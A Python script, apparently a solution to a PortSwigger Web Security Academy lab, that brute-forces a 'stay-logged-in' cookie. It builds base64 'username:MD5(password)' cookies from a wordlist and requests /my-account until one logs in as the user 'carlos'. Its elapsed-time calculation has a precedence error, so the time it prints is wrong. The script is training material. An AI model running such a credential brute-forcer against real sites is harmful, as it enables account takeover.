################################################################
#
# Author: Ahmed Elqalawii
#
# Date: 30/8/2023
#
# PortSwigger LAB: Brute-forcing a stay-logged-in cookie
#
# Steps: 1. Hash every the password
#        2. Encrypt every tha hash with the username in the cookie
#        3. GET /my-account page with every encrypted cookie
#
#################################################################

###########
# imports
###########
import requests
import re
import time
from colorama import Fore
import hashlib
import base64

#############################
# Global Variables
#############################
FAILED_PASSWORDS = []
FAILED_PASSWORDS_COUNTER = 0

# change this to your lab URL
url = "https://0a86009d0347d0868115fc7c00b70099.web-security-academy.net"
# change the paths to your lists
passwords = open("/home/ahmed/passwords",
                 'rt').read().splitlines()


##################################
# Function to bure force password
##################################
def brute_force_password(start_time, url, valid_user, passwords):
    global FAILED_PASSWORDS
    global FAILED_PASSWORDS_COUNTER
    print(Fore.WHITE + "[#] Brute forcing password of " +
          Fore.GREEN + F"{valid_user}..")
    total_passwords = len(passwords)  # number of all passwords
    for (index, password) in enumerate(passwords):
        password_hash = hashlib.md5(password.encode()).hexdigest()
        cookie_encrypted = base64.b64encode(
            f"{valid_user}:{password_hash}".encode()).decode()
        headers = {
            "Cookie": f"stay-logged-in={cookie_encrypted}"
        }
        try:  # try to login
            response = requests.get(
                url=f"{url}/my-account", headers=headers, allow_redirects=False, timeout=5)
            if response.status_code == 200:  # if you successfully logged in
                print(Fore.WHITE +
                      f"\n✅ Correct pass: " + Fore.GREEN + password)
                elapsed_time = int(time.time() - start_time / 60)
                print(Fore.GREEN + "✅ Finished in: " +
                      Fore.WHITE + str(elapsed_time) + "minutes")
                exit(0)
            else:
                print(
                    Fore.WHITE + f"[*] ({index}/{total_passwords}) {password:10} => " + Fore.RED + "Incorrect", end='\r', flush=True)
                continue
        except:
            FAILED_PASSWORDS_COUNTER += 1  # update the failed counter
            # save the failed password to try it later
            FAILED_PASSWORDS.append(password)
    None


###############################
# Starting point of the script
###############################
start_time = time.time()
brute_force_password(start_time, url, "carlos", passwords)

elapsed_time = int(time.time() - start_time / 60)
print(Fore.GREEN + "✅ Finished in: " +
      Fore.WHITE + str(elapsed_time) + "minutes")

print(Fore.RED + "Failed passwords count: " +
      Fore.WHITE + str(FAILED_PASSWORDS_COUNTER))
print(Fore.RED + "Failed passwords: " + Fore.WHITE +
      "[ " + ", ".join(FAILED_PASSWORDS) + " ]")
